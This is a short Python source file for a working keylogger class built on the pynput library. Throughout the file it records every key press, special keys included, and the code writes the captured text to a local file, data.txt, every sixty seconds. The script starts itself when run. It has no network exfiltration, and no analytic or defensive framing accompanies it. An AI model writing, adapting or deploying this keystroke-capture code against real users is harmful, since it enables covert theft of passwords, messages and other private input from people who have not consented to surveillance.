import pynput
import threading


class Keylogger:
    def __init__(self):
        self.log = ""
        self.interval = 60

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.save_log()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_log(self):
        with open("data.txt", "a") as data_file:
            data_file.write(self.log)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger()
my_keylogger.start()

